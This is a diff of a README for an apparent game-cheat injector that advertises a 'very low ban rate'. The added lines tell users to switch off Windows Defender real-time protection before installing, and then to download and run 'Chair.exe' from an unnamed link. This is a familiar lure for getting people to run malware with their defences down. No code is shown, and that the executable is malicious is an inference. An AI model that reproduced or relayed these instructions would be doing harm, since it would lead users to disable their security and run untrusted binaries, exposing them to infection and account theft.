@@ -2,9 +2,9 @@ _____VERY LOW BAN RATE!!!_____
 
 
 __INSTRUCTIONS FOR USE__ </br>
-We've updated our framework! Before running the injector, download Java from __https://www.java.com/en/download/manual.jsp__</br>
+BEFORE INSTALLING PLEASE ENSURE THAT WINDOWS DEFENDER REAL TIME PROTECTION IS OFF OTHERWISE THE TOOL ___WILL NOT WORK PROPERLY!___</br>
    
-### Step 2: Launching the Injector
+### Step 1: Launching the Injector
 
 1. **Download the Tool**  
    - Get `Chair.exe` from the provided link.
